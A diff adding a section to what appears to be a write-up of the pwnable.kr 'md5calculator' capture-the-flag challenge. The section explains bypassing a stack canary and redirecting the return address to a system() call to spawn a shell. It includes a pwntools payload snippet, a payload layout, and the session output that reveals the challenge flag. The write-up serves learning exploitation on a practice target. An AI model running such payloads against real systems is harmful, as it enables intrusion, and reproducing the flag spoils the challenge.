@@ -275,6 +275,43 @@ By using a C program of our own (see calculate_hash/calculate_hash.c) that simul
 calculate the actual canary, and write everything we'd like to the stack :).
 
 
+## Using the buffer overflow to gain a shell.
+
+What we can do is as follows:
+- Concat the payload with "/bin/bash"
+- Change the return address of `process_hash` to the call to `system` at 0x8049187
+- After the address of the `system` call, put a pointer to "/bin/bash" address (which is inside g_buf)
 
 
+This is how It's done (Taken from exploit.py file):
+```python
+payload = b'A' * BUFFER_SIZE + p32(canary) + 12 * b'A' + p32(SYSTEM_CALL_ADDRESS)
+payload += p32(G_BUF_ADDRESS + calculate_base64_length(len(payload) + 4))
+payload = base64_encode(payload)[0].replace(b'\n', b'') + SHELL_COMMAND
+```
 
+### The Payload
+**Base64 Encoded**
+- 0x200 times 'A' (0x200 is the size of the buffer)
+- Calculated Canary
+- 12 times 'A' (required to reach the return address)
+- 0x8049187 (Address of `system` call)
+- 0x804b0e0 + 716 (Address of the end of the encoded payload)
+
+**Raw**
+- /bin /sh
+
+
+## Solution =) 
+```
+[+] Opening connection to pwnable.kr on port 9002: Done
+[*] Switching to interactive mode
+$ ls
+flag
+log
+log2
+md5calculator
+super.pl
+$ cat flag
+Canary, Stack guard, Stack protector.. what is the correct expression?
+```
